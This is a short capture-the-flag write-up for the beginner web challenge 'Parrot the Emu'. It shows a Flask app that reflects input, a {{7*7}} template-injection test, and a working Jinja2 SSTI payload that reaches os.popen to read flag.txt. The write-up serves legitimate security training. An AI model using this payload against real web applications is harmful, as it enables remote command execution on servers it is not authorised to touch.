# Parrot the Emu

Category: Web (Beginner)

Points: 100

Solves: 993

>It is so nice to hear Parrot the Emu talk back



### Solution

Going to the website, we see a pretty simple flask app that reflects back our input:

![Input Hi](/images/ParrotTheEmuTest.png)

Naturally, we first test a basic SSTI and see if it works:

![SSTI {{7*7}}](/images/ParrotTheEmuSSTItest.png)

Now we just need to craft our SSTI payload (aka copy paste from HackTricks):

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
```
(This payload allows us to skip manually finding the index of popen)

And get the flag:

![SSTI Flag](/images/ParrotTheEmuFlag.png)


### Flag

```DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}```